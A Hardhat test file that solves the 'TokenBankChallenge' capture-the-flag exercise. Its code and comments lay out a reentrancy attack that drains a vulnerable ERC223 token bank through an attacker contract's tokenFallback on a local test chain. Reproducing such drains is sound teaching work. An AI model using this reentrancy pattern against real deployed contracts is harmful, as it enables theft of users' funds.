import { expect } from 'chai';
import { BigNumber, utils } from 'ethers';
import { ethers } from 'hardhat';

const TOTAL_TOKENS_SUPPLY = 1000000;

describe('TokenBankChallenge', () => {
  it('Hacking the bank', async () => {
    // get signers
    const [_owner, attacker] = await ethers.getSigners();

    // Get attacker's CA
    const attackerAddress = await attacker.getAddress();
    console.log('attacker EOA: ' + attackerAddress);

    // Deploy the bank contract with passing the attacker's address as the player argument
    const challengeFactory = await ethers.getContractFactory('TokenBankChallenge');
    const bankContract = await challengeFactory.deploy(attackerAddress);
    await bankContract.deployed();
    console.log('bank CA: ' + bankContract.address);

    // Deploy token contract
    // Deployment of TokenBankChallenge contract creates a new instance of SimpleERC223Token!
    // After deploying the bank contract, we can get the address of the SimpleERC223Token contract that was created within the bank contract:
    const tokenAddress = await bankContract.token();
    const tokenFactory = await ethers.getContractFactory('SimpleERC223Token');
    const tokenContract = tokenFactory.attach(tokenAddress); // Create instance of token contract at tokenAddress
    console.log('token CA: ' + tokenContract.address);

    const attackFactory = await ethers.getContractFactory('AttackBank');
    const attackContract = await attackFactory.deploy(bankContract.address, tokenContract.address);
    await attackContract.deployed();
    console.log('attacker CA: ' + attackContract.address);

    // The contract is vulnerable for reentrancy attack
    // The withdraw function transfers tokens before it updates the attacker’s balance

    // How to attack?
    // We need to deploy an attacker contract
    // The attacker contract will contain a tokenFallback function that calls withdraw
    // on TokenBankChallenge each time tokens are received, reentering the withdraw function recursively.

    // 4 steps
    // 1. We already have an account with 500_000 tokens at the bank
    //    Withdraw these 500_000 tokens to your wallet
    // 2. Send these 500_000 tokens from wallet (EOA) to attacker contract
    // 3. Use deposit function to deposit from attacker contract to the bank
    // 4. Withdraw from bankaccount

    // Step 1: Confirm attacker balance in TokenBankChallenge
    const attackerBalanceInBank = await bankContract.balanceOf(attacker.address);
    console.log('Attacker balance in TokenBankChallenge:', attackerBalanceInBank.toString());

    // Step 2: Withdraw from bank to attacker EOA
    const tx1 = await bankContract.connect(attacker).withdraw(attackerBalanceInBank);
    await tx1.wait();

    // Check attacker balance in TokenBankChallenge
    const attackerBalanceInBankUpdated = await bankContract.balanceOf(attacker.address);
    console.log(
      'Attacker balance in TokenBankChallenge updated:',
      attackerBalanceInBankUpdated.toString()
    );

    // Check balance in own address
    const ownBalance = await tokenContract.balanceOf(attacker.address);
    console.log('ownBalance:', ownBalance.toString());

    // Step 3: Transfer tokens from attacker EOA to AttackBank contract
    // tx2 will fail if the did not set up a fallback function
    const tx2 = await tokenContract
      .connect(attacker)
      ['transfer(address,uint256)'](attackContract.address, attackerBalanceInBank);
    await tx2.wait();

    // Step 4: Deposit tokens from AttackBank back into TokenBankChallenge
    const tx3 = await attackContract.connect(attacker).deposit();
    await tx3.wait();

    // Step 5: Execute reentrancy attack via AttackBank withdraw
    const tx4 = await attackContract.connect(attacker).withdraw();
    await tx4.wait();

    // Step 6: Withdraw tokens from attacker contract to EOA
    const tx5 = await attackContract.connect(attacker).withdrawToEOA();
    await tx5.wait();

    // Verify final state
    const bankContractBalance = await tokenContract.balanceOf(bankContract.address);
    const attackContractBalance = await tokenContract.balanceOf(attackContract.address);
    const attackerEOABalance = await tokenContract.balanceOf(attacker.address);

    console.log('Bank Contract Balance:', bankContractBalance.toString());
    console.log('Attack Contract Balance:', attackContractBalance.toString());
    console.log('Attacker Balance:', attackerEOABalance.toString());

    expect(await tokenContract.balanceOf(bankContract.address)).to.equal(0);
    expect(await tokenContract.balanceOf(attacker.address)).to.equal(
      utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
    );
  });
});
